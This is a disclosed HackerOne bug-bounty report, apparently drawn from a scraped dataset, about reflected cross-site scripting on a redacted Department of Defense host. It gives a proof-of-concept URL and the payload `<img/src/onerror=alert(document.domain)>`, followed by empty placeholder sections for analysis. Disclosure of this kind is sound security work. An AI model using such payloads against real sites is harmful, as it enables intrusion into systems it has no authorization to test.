---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1305472'
original_report_id: '1305472'
title: Reflected XSS at ████ via ██████████= parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-08-14T16:28:42.534Z'
disclosed_at: '2021-10-28T20:17:41.215Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at ████ via ██████████= parameter

## Metadata

- HackerOne Report ID: 1305472
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-10-28T20:17:41.215Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi
I found that this endpoint is vulnerable with Reflected XSS, The ███= parameter is vulnerable with RXSS
PoC:
```
██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E

```
Payload: `<img/src/onerror=alert(document.domain)> `
Regards

## Impact

RXSS

## System Host(s)
www.███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
██████████?█████=%253Cimg/src/onerror=alert(document.domain)%253E

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
